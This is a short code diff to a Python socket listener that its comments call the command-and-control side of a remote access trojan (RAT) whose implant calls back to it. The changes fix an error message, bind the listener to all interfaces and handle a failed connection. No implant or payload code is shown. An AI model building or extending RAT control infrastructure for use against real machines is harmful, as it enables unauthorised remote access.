@@ -51,11 +51,11 @@ def establishConnection(host_ip: str, host_port : int) -> socket.socket:
         print(f"Connection established to {addr[0]} on port {addr[1]}")
 
     except socket.error as e:
-        print("ERROR: Failed to establish socket connection: {e}")
+        print(f"ERROR: Failed to establish socket connection: {e}")
         return False
 
     return conn
-
+    
 
 # Simple helper function for printing commands for user
 def printHelp() -> str:
@@ -69,13 +69,15 @@ def printHelp() -> str:
 # Main starting point for our RAT; implant will call back to our C2 when executed (with its configured port)
     # TODO: change this so we either call-out or wait for a call-in from our implant
 def main():
-    host_ip = '127.0.0.1'
+    host_ip = '0.0.0.0'
     host_port = 0
     exit = False
 
     host_port = int(input("Please enter the port number on which you would like to listen for the RAT on > "))
 
     sock = establishConnection(host_ip, host_port)
+    if (not sock):
+        return
 
     while (not exit):
         print(printHelp())
